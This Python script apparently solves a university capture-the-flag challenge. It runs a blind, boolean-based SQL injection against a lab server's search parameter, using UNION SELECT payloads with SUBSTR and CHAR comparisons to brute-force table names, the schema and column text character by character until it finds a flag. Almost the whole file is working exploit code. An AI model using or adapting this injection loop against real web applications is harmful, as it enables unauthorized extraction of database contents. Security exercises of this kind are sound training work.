import requests
from re import findall

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:12102'
headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}
params = {'search': ''}

asc = []
values = {
    'tbl': "",
    'sql': "",
    'col': "",
    'txt': ""
}


def tblQuery():
    return '\' UNION SELECT tbl_name, NULL, NULL FROM sqlite_master '\
           'WHERE SUBSTR(tbl_name, 1, {}) = CHAR({}) --'\
        .format(len(asc), ','.join(asc))


def sqlQuery():
    return '\' UNION SELECT tbl_name, sql, NULL FROM sqlite_master '\
           'WHERE tbl_name = \'{}\' AND SUBSTR(sql, 1, {}) = CHAR({}) --'\
        .format(values['tbl'], len(asc), ','.join(asc))


def txtQuery():
    return '\' UNION SELECT {}, NULL, NULL FROM {} '\
           'WHERE SUBSTR({}, 1, {}) = CHAR({}) --'\
        .format(values['col'], values['tbl'], values['col'], len(asc), ','.join(asc))


queries = {
    'tbl': tblQuery,
    'sql': sqlQuery,
    'txt': txtQuery
}


def exeQuery(qid):

    end = False
    while not end:
        end = True

        for i in range(256):
            asc.append(str(i))
            params['search'] = queries[qid]()
            r = requests.get(SERVER, params=params, headers=headers)

            # Found [LEN(blog_post) + 1]
            if findall(r"Found 5", r.text):
                end = False
                values[qid] += chr(i)
                break
            asc.pop()
        print(values[qid])
    asc.clear()


"""
DB Tables:
- user
- blog_post
- s(..)
"""
values['tbl'] = 's'
asc.append(str(ord(values['tbl'])))
exeQuery('tbl')

exeQuery('sql')
for col in findall(r"\w+ TEXT", values['sql']):
    values['col'] = col.split()[0]

    exeQuery('txt')
    # Flag Format
    flag = findall(r"SSof{.*}", values['txt'])
    if flag:
        print(flag[0])
